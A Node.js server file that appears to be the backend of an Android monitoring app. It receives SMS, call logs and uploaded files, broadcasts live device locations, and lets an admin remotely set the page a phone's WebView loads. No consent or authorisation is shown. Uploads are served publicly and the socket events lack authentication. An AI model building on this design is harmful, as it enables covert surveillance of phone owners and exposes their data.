// Core Node.js modules
const http = require('http');
const path = require('path');

// Third-party packages
const express = require('express');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const cors = require('cors');
require('dotenv').config();

// Custom middleware
const authMiddleware = require('./middleware/authMiddleware');

// Initialize Express app
const app = express();

// === MIDDLEWARE SETUP ===
// Enable Cross-Origin Resource Sharing
app.use(cors());
// Parse incoming JSON requests
app.use(express.json());

// === DATABASE CONNECTION ===
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
.then(() => console.log('MongoDB Connected Successfully'))
.catch(err => {
    console.error('MongoDB Connection Error:', err.message);
    process.exit(1); // Exit process with failure
});

// === API ROUTES ===
// Statically serve the 'uploads' folder for file access
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// Register API route handlers
app.use('/api/auth', require('./routes/auth'));
app.use('/api/data', require('./routes/data')); // Handles SMS, Call Logs
app.use('/api/files', require('./routes/fileManager'));
// Note: Create a 'routes/devices.js' for device registration and listing
// app.use('/api/devices', require('./routes/devices'));

// === CONFIGURATION ROUTES ===
// In-memory variable for WebView URL
let webviewUrl = process.env.WEBVIEW_URL || 'https://www.google.com';

// Endpoint for Android app to get the current WebView URL
app.get('/api/config/webview-url', (req, res) => {
    res.json({ url: webviewUrl });
});

// Secured endpoint for Admin Panel to update the WebView URL
app.post('/api/config/webview-url', authMiddleware, (req, res) => {
    const { url } = req.body;
    // Basic validation for the URL
    if (!url || typeof url !== 'string' || !url.startsWith('http')) {
        return res.status(400).json({ msg: 'A valid URL starting with http/https is required' });
    }
    webviewUrl = url;
    console.log(`WebView URL updated to: ${webviewUrl}`);
    res.json({ msg: 'WebView URL updated successfully!', url: webviewUrl });
});

// === PRODUCTION DEPLOYMENT SETUP ===
// This block will run only when the app is in production mode
if (process.env.NODE_ENV === 'production') {
    // Set the static folder for the built React app
    app.use(express.static('client/build'));

    // For any route that is not an API route, serve the React app's index.html
    app.get('*', (req, res) => {
        res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'));
    });
}

// === HTTP SERVER & SOCKET.IO SETUP ===
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "http://localhost:3000", // Allow connection from React dev server
        methods: ["GET", "POST"]
    }
});

// Handle real-time connections
io.on('connection', (socket) => {
    console.log(`User Connected: ${socket.id}`);

    // Event to join a device-specific room
    socket.on('joinRoom', (deviceId) => {
        socket.join(deviceId);
        console.log(`Socket ${socket.id} joined room for device: ${deviceId}`);
    });

    // Event for receiving and broadcasting location updates
    socket.on('updateLocation', (data) => {
        if (data && data.deviceId) {
            // TODO: Save the location to the database for persistence
            // Broadcast the location to all clients in the device's room
            io.to(data.deviceId).emit('locationUpdated', data);
            console.log(`Location update for ${data.deviceId} broadcasted.`);
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`User Disconnected: ${socket.id}`);
    });
});

// === START THE SERVER ===
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
